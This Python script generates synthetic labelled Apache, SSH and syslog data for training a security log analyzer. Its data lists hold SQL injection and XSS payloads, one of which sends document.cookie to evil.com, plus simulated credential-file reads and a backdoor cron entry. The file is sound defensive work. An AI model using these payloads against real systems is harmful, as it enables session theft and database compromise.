"""
data/generate_dataset.py
────────────────────────
Synthetic log dataset generator for SOC Log Analyzer ML training.

Produces realistic, labeled log data covering:
  • Normal traffic patterns
  • Brute-force SSH and HTTP attacks
  • DDoS / HTTP flood patterns
  • Port scanning behavior
  • SQL injection / XSS probing
  • Privilege escalation events
  • Insider threat patterns
  • Automated bot crawlers
  • APT (Advanced Persistent Threat) slow & low attacks

Output: data/training_dataset.csv  (raw feature matrix, labeled)
        data/sample_apache.log      (Apache log format)
        data/sample_ssh.log         (SSH auth log format)
        data/sample_syslog.log      (syslog format)
"""

import csv
import random
import math
from datetime import datetime, timedelta
from faker import Faker

fake = Faker()
random.seed(42)

# ── Config ────────────────────────────────────────────────────────────────────
START_TIME   = datetime(2024, 10, 10, 8, 0, 0)
TOTAL_HOURS  = 10
NORMAL_IPS   = 40     # legitimate user IPs
ATTACKER_IPS = 15     # malicious IPs

# Attack type labels
LABELS = {
    "normal":          0,
    "brute_force":     1,
    "ddos":            2,
    "port_scan":       3,
    "sqli":            4,
    "xss":             5,
    "privilege_esc":   6,
    "insider_threat":  7,
    "bot_crawler":     8,
    "apt_slow_low":    9,
}

# ── IP pools ──────────────────────────────────────────────────────────────────
INTERNAL_IPS = [f"192.168.{random.randint(1,5)}.{random.randint(2,254)}" for _ in range(NORMAL_IPS)]
EXTERNAL_NORMAL = [fake.ipv4_public() for _ in range(20)]
ATTACKER_POOL   = [fake.ipv4_public() for _ in range(ATTACKER_IPS)]

# Known bad IPs (Tor exit nodes / known scanners simulation)
KNOWN_BAD_IPS = [
    "185.220.101.12", "45.33.32.156", "91.108.4.55",
    "198.51.100.23",  "203.0.113.100", "89.248.167.131",
    "194.165.16.72",  "80.82.77.33",   "162.142.125.0",
    "71.6.146.185",
]

USERNAMES   = ["root", "admin", "user", "test", "guest", "oracle",
               "postgres", "ubuntu", "pi", "deploy", "www-data", "jenkins"]
HTTP_PATHS  = ["/", "/index.html", "/api/v1/users", "/api/v1/data",
               "/dashboard", "/login", "/logout", "/static/main.css",
               "/api/health", "/products", "/about", "/contact"]
HTTP_METHODS = ["GET", "POST", "PUT", "DELETE"]
USER_AGENTS  = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "curl/7.68.0",
    "python-requests/2.28.0",
    "sqlmap/1.7.8",
    "Nikto/2.1.6",
    "masscan/1.3",
    "Go-http-client/1.1",
    "zgrab/0.x",
    "DirBuster-1.0-RC1",
]

SQLI_PAYLOADS = [
    "/api/users?id=1 UNION SELECT * FROM users--",
    "/search?q=1' OR '1'='1",
    "/login?user=admin'--&pass=x",
    "/api/data?filter=1; DROP TABLE users;--",
    "/profile?id=1 AND SLEEP(5)--",
    "/products?cat=1 UNION SELECT null,username,password FROM admin--",
]
XSS_PAYLOADS = [
    "/search?q=<script>alert(document.cookie)</script>",
    "/comment?text=<img src=x onerror=alert(1)>",
    "/profile?name=javascript:eval(atob('...'))",
    "/page?title=<svg onload=fetch('https://evil.com/?c='+document.cookie)>",
]
SCAN_PATHS = [
    "/.env", "/.git/config", "/wp-admin", "/phpmyadmin",
    "/admin", "/backup.sql", "/config.php", "/.htaccess",
    "/server-status", "/api/swagger", "/actuator", "/console",
    "/manager/html", "/.DS_Store", "/web.config",
]

# ── Helpers ───────────────────────────────────────────────────────────────────

def jitter(base_time, max_seconds=300):
    return base_time + timedelta(seconds=random.randint(0, max_seconds))

def ts_apache(dt):
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")

def ts_syslog(dt):
    return dt.strftime("%b %d %H:%M:%S")

def rand_bytes(status):
    if status == 200: return random.randint(512, 50000)
    if status in (301, 302): return random.randint(100, 300)
    if status in (400, 401, 403, 404): return random.randint(50, 512)
    if status >= 500: return random.randint(100, 1000)
    return random.randint(100, 5000)

# ── Feature record (for CSV ML dataset) ──────────────────────────────────────

def make_feature_record(
    ip, timestamp, request_count, error_4xx, error_5xx,
    unique_paths, failed_logins, bytes_mean, time_spread,
    login_attempts, req_rate_per_sec, has_sqli, has_xss,
    is_known_bad, distinct_ports, ua_diversity, label_name
):
    return {
        "ip":                ip,
        "timestamp":         timestamp.isoformat(),
        "request_count":     request_count,
        "error_4xx_count":   error_4xx,
        "error_5xx_count":   error_5xx,
        "unique_paths":      unique_paths,
        "failed_logins":     failed_logins,
        "bytes_sent_mean":   round(bytes_mean, 2),
        "time_spread_secs":  time_spread,
        "login_attempts":    login_attempts,
        "req_rate_per_sec":  round(req_rate_per_sec, 4),
        "has_sqli":          int(has_sqli),
        "has_xss":           int(has_xss),
        "is_known_bad_ip":   int(is_known_bad),
        "distinct_ports":    distinct_ports,
        "ua_diversity":      round(ua_diversity, 4),
        "label":             LABELS[label_name],
        "label_name":        label_name,
    }


# ═════════════════════════════════════════════════════════════════════════════
# LOG GENERATORS
# ═════════════════════════════════════════════════════════════════════════════

apache_lines  = []
ssh_lines     = []
syslog_lines  = []
feature_rows  = []

def add_apache(dt, ip, method, path, status, ua=None, ref="-"):
    b = rand_bytes(status)
    ua = ua or random.choice(USER_AGENTS[:3])
    apache_lines.append(
        f'{ip} - - [{ts_apache(dt)}] "{method} {path} HTTP/1.1" {status} {b} '
        f'"{ref}" "{ua}"'
    )
    return b

def add_ssh(dt, success, ip, user):
    host = "prod-server-01"
    pid  = random.randint(1000, 9999)
    port = random.randint(40000, 65535)
    if success:
        ssh_lines.append(
            f"{ts_syslog(dt)} {host} sshd[{pid}]: Accepted password for {user} "
            f"from {ip} port {port} ssh2"
        )
    else:
        verb = random.choice(["Failed password", "Invalid user"])
        ssh_lines.append(
            f"{ts_syslog(dt)} {host} sshd[{pid}]: {verb} for {user} "
            f"from {ip} port {port} ssh2"
        )

def add_syslog(dt, action, ip="0.0.0.0", msg=""):
    host = "prod-server-01"
    proc_map = {
        "USER_CREATED":    f"useradd[{random.randint(1000,9999)}]: new user: {msg}",
        "SUDO_EXEC":       f"sudo[{random.randint(1000,9999)}]: {msg}",
        "FIREWALL_DROP":   f"kernel: Firewall: IN=eth0 OUT= SRC={ip} DST=10.0.0.1 {msg} DROPPED",
        "CRON_JOB":        f"cron[{random.randint(1000,9999)}]: (root) CMD ({msg})",
        "PASSWORD_CHANGE": f"passwd[{random.randint(1000,9999)}]: password changed for {msg}",
        "OOM_KILL":        f"kernel: Out of memory: Kill process {random.randint(1000,9999)} score 900",
        "AUTH_FAILURE":    f"sshd[{random.randint(1000,9999)}]: authentication failure; rhost={ip} user={msg}",
    }
    body = proc_map.get(action, f"syslog[1]: {msg}")
    syslog_lines.append(f"{ts_syslog(dt)} {host} {body}")


# ═════════════════════════════════════════════════════════════════════════════
# TRAFFIC SCENARIOS
# ═════════════════════════════════════════════════════════════════════════════

def gen_normal_traffic():
    """Legitimate users browsing the app."""
    t = START_TIME
    for ip in INTERNAL_IPS:
        num_sessions = random.randint(3, 12)
        for _ in range(num_sessions):
            session_start = jitter(t, TOTAL_HOURS * 3600)
            num_reqs = random.randint(2, 20)
            paths_hit = set()
            bytes_list = []
            for r in range(num_reqs):
                req_t  = session_start + timedelta(seconds=r * random.randint(2, 30))
                path   = random.choice(HTTP_PATHS)
                method = "GET" if path not in ("/login", "/api/v1/users") else random.choice(["GET","POST"])
                status = 200 if random.random() > 0.05 else random.choice([404, 302])
                b      = add_apache(req_t, ip, method, path, status)
                paths_hit.add(path)
                bytes_list.append(b)

            feature_rows.append(make_feature_record(
                ip=ip, timestamp=session_start,
                request_count=num_reqs, error_4xx=0, error_5xx=0,
                unique_paths=len(paths_hit), failed_logins=0,
                bytes_mean=sum(bytes_list)/len(bytes_list) if bytes_list else 0,
                time_spread=num_reqs * 15,
                login_attempts=0, req_rate_per_sec=0.1,
                has_sqli=False, has_xss=False,
                is_known_bad=False, distinct_ports=1, ua_diversity=0.1,
                label_name="normal",
            ))


def gen_brute_force():
    """SSH and HTTP brute-force login attacks."""
    for _ in range(20):
        ip   = random.choice(KNOWN_BAD_IPS + ATTACKER_POOL)
        t    = jitter(START_TIME, TOTAL_HOURS * 3600)
        user = random.choice(USERNAMES)
        burst = random.randint(8, 40)

        # SSH brute-force
        for i in range(burst):
            req_t = t + timedelta(seconds=i * random.uniform(0.3, 2.5))
            add_ssh(req_t, False, ip, user)

        # Optionally succeed at the end
        if random.random() > 0.6:
            add_ssh(t + timedelta(seconds=burst * 2), True, ip, user)
            add_syslog(t + timedelta(seconds=burst * 3), "AUTH_FAILURE", ip, user)

        # HTTP brute-force
        for i in range(burst):
            req_t = t + timedelta(seconds=i * random.uniform(0.5, 3))
            add_apache(req_t, ip, "POST", "/login", 401)

        feature_rows.append(make_feature_record(
            ip=ip, timestamp=t,
            request_count=burst * 2, error_4xx=burst, error_5xx=0,
            unique_paths=1, failed_logins=burst,
            bytes_mean=400, time_spread=burst * 2,
            login_attempts=burst, req_rate_per_sec=burst / 60,
            has_sqli=False, has_xss=False,
            is_known_bad=(ip in KNOWN_BAD_IPS), distinct_ports=1, ua_diversity=0.0,
            label_name="brute_force",
        ))


def gen_ddos():
    """HTTP flood / volumetric DDoS simulation."""
    for _ in range(10):
        ip   = random.choice(ATTACKER_POOL + KNOWN_BAD_IPS)
        t    = jitter(START_TIME, TOTAL_HOURS * 3600)
        burst = random.randint(50, 300)
        duration = random.uniform(1.0, 5.0)

        bytes_list = []
        for i in range(burst):
            req_t = t + timedelta(seconds=(i / burst) * duration)
            path  = random.choice(HTTP_PATHS)
            b     = add_apache(req_t, ip, "GET", path, 200)
            bytes_list.append(b)

        feature_rows.append(make_feature_record(
            ip=ip, timestamp=t,
            request_count=burst, error_4xx=0, error_5xx=0,
            unique_paths=min(burst, 5), failed_logins=0,
            bytes_mean=sum(bytes_list)/len(bytes_list),
            time_spread=duration,
            login_attempts=0, req_rate_per_sec=burst / duration,
            has_sqli=False, has_xss=False,
            is_known_bad=(ip in KNOWN_BAD_IPS), distinct_ports=1, ua_diversity=0.0,
            label_name="ddos",
        ))


def gen_port_scan():
    """TCP port scanning via firewall drops."""
    for _ in range(8):
        ip = random.choice(ATTACKER_POOL + KNOWN_BAD_IPS)
        t  = jitter(START_TIME, TOTAL_HOURS * 3600)
        ports = random.sample(range(1, 65535), random.randint(20, 200))

        for i, port in enumerate(ports):
            scan_t = t + timedelta(seconds=i * 0.05)
            add_syslog(scan_t, "FIREWALL_DROP", ip, f"PROTO=TCP DPT={port}")

        feature_rows.append(make_feature_record(
            ip=ip, timestamp=t,
            request_count=len(ports), error_4xx=0, error_5xx=0,
            unique_paths=0, failed_logins=0,
            bytes_mean=0, time_spread=len(ports) * 0.05,
            login_attempts=0, req_rate_per_sec=len(ports) / 10,
            has_sqli=False, has_xss=False,
            is_known_bad=(ip in KNOWN_BAD_IPS), distinct_ports=len(ports), ua_diversity=0.0,
            label_name="port_scan",
        ))


def gen_sqli():
    """SQL injection attempts via HTTP."""
    for _ in range(15):
        ip = random.choice(ATTACKER_POOL + KNOWN_BAD_IPS)
        t  = jitter(START_TIME, TOTAL_HOURS * 3600)
        payloads = random.sample(SQLI_PAYLOADS, random.randint(2, len(SQLI_PAYLOADS)))
        ua = random.choice(["sqlmap/1.7.8", "python-requests/2.28.0"])

        for i, payload in enumerate(payloads):
            req_t = t + timedelta(seconds=i * random.uniform(0.5, 5))
            add_apache(req_t, ip, "GET", payload, random.choice([400, 500, 200]), ua=ua)

        feature_rows.append(make_feature_record(
            ip=ip, timestamp=t,
            request_count=len(payloads), error_4xx=len(payloads)//2, error_5xx=1,
            unique_paths=len(payloads), failed_logins=0,
            bytes_mean=300, time_spread=len(payloads) * 3,
            login_attempts=0, req_rate_per_sec=len(payloads) / 30,
            has_sqli=True, has_xss=False,
            is_known_bad=(ip in KNOWN_BAD_IPS), distinct_ports=1, ua_diversity=0.0,
            label_name="sqli",
        ))


def gen_xss():
    """Cross-site scripting probe attempts."""
    for _ in range(12):
        ip = random.choice(ATTACKER_POOL)
        t  = jitter(START_TIME, TOTAL_HOURS * 3600)
        payloads = random.sample(XSS_PAYLOADS, random.randint(1, len(XSS_PAYLOADS)))

        for i, payload in enumerate(payloads):
            req_t = t + timedelta(seconds=i * random.uniform(1, 10))
            add_apache(req_t, ip, "GET", payload, random.choice([200, 400]), ua="python-requests/2.28.0")

        feature_rows.append(make_feature_record(
            ip=ip, timestamp=t,
            request_count=len(payloads), error_4xx=1, error_5xx=0,
            unique_paths=len(payloads), failed_logins=0,
            bytes_mean=200, time_spread=len(payloads) * 5,
            login_attempts=0, req_rate_per_sec=len(payloads) / 60,
            has_sqli=False, has_xss=True,
            is_known_bad=False, distinct_ports=1, ua_diversity=0.0,
            label_name="xss",
        ))


def gen_privilege_escalation():
    """Linux privilege escalation events."""
    for _ in range(6):
        t      = jitter(START_TIME, TOTAL_HOURS * 3600)
        attacker_user = random.choice(["www-data", "apache", "mysql", "nobody"])
        new_user = fake.user_name()

        add_syslog(t, "USER_CREATED", msg=f"name={new_user}, UID=0, GID=0, home=/root, shell=/bin/bash")
        add_syslog(t + timedelta(seconds=5), "SUDO_EXEC",
                   msg=f"{attacker_user} : TTY=pts/0 ; USER=root ; COMMAND=/bin/cat /etc/shadow")
        add_syslog(t + timedelta(seconds=10), "PASSWORD_CHANGE", msg=new_user)
        add_syslog(t + timedelta(seconds=15), "CRON_JOB", msg="/tmp/.hidden/backdoor.sh")

        feature_rows.append(make_feature_record(
            ip="0.0.0.0", timestamp=t,
            request_count=4, error_4xx=0, error_5xx=0,
            unique_paths=0, failed_logins=0,
            bytes_mean=0, time_spread=15,
            login_attempts=0, req_rate_per_sec=0.1,
            has_sqli=False, has_xss=False,
            is_known_bad=False, distinct_ports=0, ua_diversity=0.0,
            label_name="privilege_esc",
        ))


def gen_insider_threat():
    """Insider threat: legitimate user accessing unusual resources."""
    for _ in range(8):
        ip = random.choice(INTERNAL_IPS)
        t  = jitter(START_TIME, TOTAL_HOURS * 3600)
        # Legitimate user but accessing bulk data, unusual hours (2-4 AM)
        t_odd = t.replace(hour=random.randint(1, 4), minute=random.randint(0, 59))

        bulk_paths = ["/api/v1/users", "/api/v1/export", "/api/v1/reports",
                      "/admin/backup", "/api/v1/logs", "/api/v1/financials"]
        bytes_list = []
        for i, path in enumerate(bulk_paths):
            req_t = t_odd + timedelta(seconds=i * 30)
            b = add_apache(req_t, ip, "GET", path, 200)
            bytes_list.append(b * 10)   # large transfers

        feature_rows.append(make_feature_record(
            ip=ip, timestamp=t_odd,
            request_count=len(bulk_paths), error_4xx=0, error_5xx=0,
            unique_paths=len(bulk_paths), failed_logins=0,
            bytes_mean=sum(bytes_list)/len(bytes_list),
            time_spread=len(bulk_paths) * 30,
            login_attempts=0, req_rate_per_sec=0.03,
            has_sqli=False, has_xss=False,
            is_known_bad=False, distinct_ports=1, ua_diversity=0.1,
            label_name="insider_threat",
        ))


def gen_bot_crawler():
    """Automated bot crawlers scanning all paths."""
    for _ in range(10):
        ip = random.choice(ATTACKER_POOL)
        t  = jitter(START_TIME, TOTAL_HOURS * 3600)
        paths = SCAN_PATHS + random.sample(HTTP_PATHS, 5)
        random.shuffle(paths)
        ua = random.choice(["Go-http-client/1.1", "DirBuster-1.0-RC1", "masscan/1.3"])

        bytes_list = []
        errors = 0
        for i, path in enumerate(paths):
            req_t  = t + timedelta(seconds=i * random.uniform(0.1, 0.5))
            status = random.choice([200, 403, 404, 404, 404])
            if status >= 400: errors += 1
            b = add_apache(req_t, ip, "GET", path, status, ua=ua)
            bytes_list.append(b)

        feature_rows.append(make_feature_record(
            ip=ip, timestamp=t,
            request_count=len(paths), error_4xx=errors, error_5xx=0,
            unique_paths=len(paths), failed_logins=0,
            bytes_mean=sum(bytes_list)/len(bytes_list),
            time_spread=len(paths) * 0.3,
            login_attempts=0, req_rate_per_sec=len(paths) / (len(paths) * 0.3),
            has_sqli=False, has_xss=False,
            is_known_bad=False, distinct_ports=1, ua_diversity=0.05,
            label_name="bot_crawler",
        ))


def gen_apt_slow_low():
    """APT slow-and-low: stealthy exfiltration spread over hours."""
    for _ in range(5):
        ip = random.choice(ATTACKER_POOL)
        t  = jitter(START_TIME, 3600)   # start early
        # One request every 15-45 minutes, spread over 8 hours
        hours = 8
        num_reqs = random.randint(12, 20)
        interval = (hours * 3600) / num_reqs

        paths_hit = set()
        bytes_list = []
        for i in range(num_reqs):
            req_t = t + timedelta(seconds=i * interval + random.randint(-300, 300))
            path  = random.choice(["/api/v1/export", "/api/v1/users",
                                   "/api/v1/financials", "/admin/config"])
            b     = add_apache(req_t, ip, "GET", path, 200)
            paths_hit.add(path)
            bytes_list.append(b * 5)

        feature_rows.append(make_feature_record(
            ip=ip, timestamp=t,
            request_count=num_reqs, error_4xx=0, error_5xx=0,
            unique_paths=len(paths_hit), failed_logins=0,
            bytes_mean=sum(bytes_list)/len(bytes_list),
            time_spread=hours * 3600,
            login_attempts=0, req_rate_per_sec=num_reqs / (hours * 3600),
            has_sqli=False, has_xss=False,
            is_known_bad=(ip in KNOWN_BAD_IPS), distinct_ports=1, ua_diversity=0.8,
            label_name="apt_slow_low",
        ))


# ═════════════════════════════════════════════════════════════════════════════
# RUN ALL GENERATORS
# ═════════════════════════════════════════════════════════════════════════════

print("Generating synthetic SOC dataset...")
gen_normal_traffic()
print(f"  ✓ Normal traffic ({len(feature_rows)} records so far)")
gen_brute_force()
print(f"  ✓ Brute-force attacks")
gen_ddos()
print(f"  ✓ DDoS floods")
gen_port_scan()
print(f"  ✓ Port scans")
gen_sqli()
print(f"  ✓ SQL injection probes")
gen_xss()
print(f"  ✓ XSS probes")
gen_privilege_escalation()
print(f"  ✓ Privilege escalation events")
gen_insider_threat()
print(f"  ✓ Insider threat patterns")
gen_bot_crawler()
print(f"  ✓ Bot crawlers")
gen_apt_slow_low()
print(f"  ✓ APT slow-and-low patterns")

# ── Sort log lines by timestamp ───────────────────────────────────────────────
apache_lines.sort()
ssh_lines.sort()
syslog_lines.sort()

# ── Write logs ────────────────────────────────────────────────────────────────
import os
os.makedirs("data", exist_ok=True)

with open("data/sample_apache.log", "w") as f:
    f.write("\n".join(apache_lines))
print(f"\n  ✓ Apache log: {len(apache_lines)} lines → data/sample_apache.log")

with open("data/sample_ssh.log", "w") as f:
    f.write("\n".join(ssh_lines))
print(f"  ✓ SSH log:    {len(ssh_lines)} lines → data/sample_ssh.log")

with open("data/sample_syslog.log", "w") as f:
    f.write("\n".join(syslog_lines))
print(f"  ✓ Syslog:     {len(syslog_lines)} lines → data/sample_syslog.log")

# ── Write CSV training dataset ────────────────────────────────────────────────
if feature_rows:
    fieldnames = list(feature_rows[0].keys())
    with open("data/training_dataset.csv", "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(feature_rows)

# ── Summary ───────────────────────────────────────────────────────────────────
from collections import Counter
label_counts = Counter(r["label_name"] for r in feature_rows)
print(f"\n  ✓ Training dataset: {len(feature_rows)} records → data/training_dataset.csv")
print("\nLabel distribution:")
for label, count in sorted(label_counts.items()):
    bar = "█" * min(count, 40)
    print(f"  {label:20s} {count:4d}  {bar}")
print(f"\nTotal: {len(feature_rows)} records, {len(LABELS)} attack classes")
